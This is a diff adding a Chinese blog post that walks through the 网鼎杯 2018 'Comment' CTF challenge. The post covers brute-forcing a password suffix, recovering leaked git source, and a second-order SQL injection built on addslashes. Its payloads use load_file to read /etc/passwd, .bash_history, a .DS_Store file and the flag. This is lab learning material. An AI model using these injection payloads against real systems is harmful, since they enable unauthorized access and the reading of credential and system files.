@@ -1,0 +1,264 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8" />
+    <title>[网鼎杯 2018]Comment | why</title>
+    <meta name="author" content="why" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>WHY</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;WHY</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>[网鼎杯 2018]Comment</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/6/16
+        </span>
+        
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <p>先随便写点东西</p>
+<p>发现要我们登录</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406161557200.png" alt="image-20240616155446636"></p>
+<p>直接爆破密码最后三位即可</p>
+<p>发现是666</p>
+<p>所以登录上去</p>
+<p>之后对各个地方尝试sql注入，都失败了，所以换一个思路</p>
+<p>扫描一下目录发现git泄露，githacker找到源码</p>
+<p>但是</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406161641956.png" alt="在这里插入图片描述"></p>
+<p>不是完全的。</p>
+<p>所以在githacker得到的文件中进行回复</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git log --reflog</span><br></pre></td></tr></table></figure>
+
+<p>会发现很多</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406161643191.png" alt="image-20240616164302160"></p>
+<p>我们一个个试，最后可以得到完整代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;mysql.php&quot;;</span><br><span class="line">session_start();</span><br><span class="line">if($_SESSION[&#x27;login&#x27;] != &#x27;yes&#x27;)&#123;</span><br><span class="line">    header(&quot;Location: ./login.php&quot;);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;do&#x27;]))&#123;</span><br><span class="line">switch ($_GET[&#x27;do&#x27;])</span><br><span class="line">&#123;</span><br><span class="line">case &#x27;write&#x27;:</span><br><span class="line">    $category = addslashes($_POST[&#x27;category&#x27;]);</span><br><span class="line">    $title = addslashes($_POST[&#x27;title&#x27;]);</span><br><span class="line">    $content = addslashes($_POST[&#x27;content&#x27;]);</span><br><span class="line">    $sql = &quot;insert into board</span><br><span class="line">            set category = &#x27;$category&#x27;,</span><br><span class="line">                title = &#x27;$title&#x27;,</span><br><span class="line">                content = &#x27;$content&#x27;&quot;;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    header(&quot;Location: ./index.php&quot;);</span><br><span class="line">    break;</span><br><span class="line">case &#x27;comment&#x27;:</span><br><span class="line">    $bo_id = addslashes($_POST[&#x27;bo_id&#x27;]);</span><br><span class="line">    $sql = &quot;select category from board where id=&#x27;$bo_id&#x27;&quot;;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    $num = mysql_num_rows($result);</span><br><span class="line">    if($num&gt;0)&#123;</span><br><span class="line">    $category = mysql_fetch_array($result)[&#x27;category&#x27;];</span><br><span class="line">    $content = addslashes($_POST[&#x27;content&#x27;]);</span><br><span class="line">    $sql = &quot;insert into comment</span><br><span class="line">            set category = &#x27;$category&#x27;,</span><br><span class="line">                content = &#x27;$content&#x27;,</span><br><span class="line">                bo_id = &#x27;$bo_id&#x27;&quot;;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    header(&quot;Location: ./comment.php?id=$bo_id&quot;);</span><br><span class="line">    break;</span><br><span class="line">default:</span><br><span class="line">    header(&quot;Location: ./index.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    header(&quot;Location: ./index.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>发现了，当do&#x3D;comment时，我们可以从category里进行查询</p>
+<p>所以我们可以进行sql注入</p>
+<p>content变量在留言界面中</p>
+<p>我们发现<br>    $sql &#x3D; “insert into comment<br>            set category &#x3D; ‘$category’,<br>                content &#x3D; ‘$content’,<br>                bo_id &#x3D; ‘$bo_id’”;<br>他是分行的，所以#,–+不能用了，得使用&#x2F;**&#x2F;多行注释(好像%00截断也行，没有试过)<br>构造:$category:’ content&#x3D;(语句),&#x2F;*<br>    $content:*&#x2F;#</p>
+<p>所以我们</p>
+<p>1.在发帖页面写入’,content&#x3D;(user()),&#x2F;*</p>
+<p>2.之后留言,内容为:*&#x2F;#   得知是root权限<br>这里要注意：查数据库的数据不需要root权限，而使用load_file读取文件内容需要root权限，所以应该是想让我们读取文件(查数据的我也尝试过，什么都没有)</p>
+<p>3.尝试读文件（步骤一样的我就不截图了），有些wp 的load_file前面加了select，因为数据库查找留言内容时前面已经加了select，所以可以不用加select</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;,content=(load_file(&quot;/etc/passwd&quot;)),/*</span><br><span class="line">*/#</span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406161701395.png" alt="在这里插入图片描述"></p>
+<p>发现出来root用户以外，只有www这个用户在&#x2F;home&#x2F;www目录下用了&#x2F;bin&#x2F;bash</p>
+<p>4.查看&#x2F;home&#x2F;www&#x2F;.bash_history<br>.bash_history ：保存了当前用户使用过的历史命令,方便查找</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;,content=(load_file(&quot;/home/www/.bash_history&quot;)),/*</span><br><span class="line">*/#</span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406161701206.png" alt="在这里插入图片描述"></p>
+<p>解释一下：先进入&#x2F;tmp目录,解压缩了html.zip文件(得到&#x2F;tmp&#x2F;html)，之后将html.zip删除了，拷贝了一份html给了&#x2F;var&#x2F;www目录(得到&#x2F;var&#x2F;www&#x2F;html)，之后将&#x2F;var&#x2F;www&#x2F;html下的.DS_Store文件删除，但是&#x2F;tmp&#x2F;html下的.DS_Store文件没有删除,查看一下<br>unzip:解压缩<br>.DS_Store:这个文件是常见的备份文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;,content=(load_file(&quot;/tmp/html/.DS_Store&quot;)),/*</span><br><span class="line">*/#</span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406161701781.png" alt="在这里插入图片描述"></p>
+<p>内容还挺长的,查看源码复制,放在burpsuite里面进行ASCII hex 解码<br>得到</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406161702672.png" alt="在这里插入图片描述"></p>
+<p>看到里面有flag_8946e1ff1ee3e40f.php</p>
+<p>产生查看</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;,content=(hex(load_file(&quot;/var/www/html/flag_8946e1ff1ee3e40f.php&quot;))),/*</span><br><span class="line">*/#</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 why
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;why
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+<script src="/js/<file>"></script>
+<link rel="stylesheet" href="/css/<file>" />
+</body>
+</html>
